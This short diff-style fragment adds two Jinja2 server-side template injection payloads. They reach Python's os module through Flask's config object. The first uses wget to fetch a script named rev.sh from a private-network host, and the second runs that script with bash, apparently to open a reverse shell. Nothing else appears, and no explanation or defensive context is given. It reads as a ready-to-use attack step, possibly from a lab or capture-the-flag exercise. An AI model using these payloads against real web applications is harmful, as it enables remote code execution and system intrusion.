@@ -1,0 +1,2 @@
+{{config.__class__.__init__.__globals__['os'].popen('wget http://192.168.45.226/rev.sh').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('bash rev.sh').read()}}
